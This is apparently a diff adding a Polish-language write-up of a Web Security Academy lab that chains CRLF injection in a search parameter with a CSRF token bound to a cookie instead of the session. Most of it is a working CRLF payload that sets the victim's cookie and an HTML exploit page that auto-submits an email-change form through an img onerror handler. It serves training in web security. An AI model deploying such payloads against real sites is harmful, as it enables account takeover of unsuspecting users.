@@ -1,0 +1,53 @@
+CRLF injection (Carriage Return Line Feed injection) to podatność bezpieczeństwa aplikacji webowych (CWE-93), która występuje, gdy aplikacja bez odpowiedniego oczyszczenia (sanitaryzacji) wstawia dane wprowadzone przez użytkownika do nagłówków HTTP, plików logów lub innych strumieni danych
+
+1. Token CSRF nie był przypisany do sesji użytkownika, tylko do osobnego ciasteczka:
+
+  csrfKey=dyyopJmexVrlPbbpWgWj45CYcvKjC2I4
+
+  Pasujący token z formularza:
+
+  csrf=9ZSVbLDokXVsO27nNgZNPKoKYx7Gh56u
+
+  2. Endpoint wyszukiwania pozwalał przez CRLF injection ustawić ofierze nasze csrfKey:
+
+  /?search=test%0d%0aSet-Cookie:%20csrfKey=dyyopJmexVrlPbbpWgWj45CYcvKjC2I4%3b%20SameSite=None
+
+  %0d%0a oznacza nową linię HTTP. Serwer potraktował dalszy tekst jako nagłówek:
+
+  Set-Cookie: csrfKey=dyyopJmexVrlPbbpWgWj45CYcvKjC2I4
+
+  3. Na exploit serverze zapisałem:
+
+  <html>
+  <body>
+    <form action="https://0afc00280458b4d68231c4ec00ef0081.web-security-academy.net/my-account/change-
+    email"
+          method="POST">
+      <input type="hidden"
+             name="email"
+             value="victim-846271@example.net">
+
+      <input type="hidden"
+             name="csrf"
+             value="9ZSVbLDokXVsO27nNgZNPKoKYx7Gh56u">
+    </form>
+
+    <img
+      src="https://0afc00280458b4d68231c4ec00ef0081.web-security-academy.net/?search=test%0d%0aSet-
+      Cookie:%20csrfKey=dyyopJmexVrlPbbpWgWj45CYcvKjC2I4%3b%20SameSite=None"
+      onerror="document.forms[0].submit()">
+  </body>
+  </html>
+
+  Przebieg ataku:
+
+  Ofiara otwiera exploit
+  → obrazek ustawia jej nasze csrfKey
+  → obrazek nie jest prawidłowym obrazem, więc uruchamia onerror
+  → formularz wysyła pasujący token csrf
+  → przeglądarka dodaje sesję ofiary
+  → e-mail ofiary zostaje zmieniony
+
+  Błąd aplikacji: serwer sprawdzał zgodność csrf z csrfKey, ale nie sprawdzał, czy ta para należy do
+  sesji aktualnego użytkownika.
+
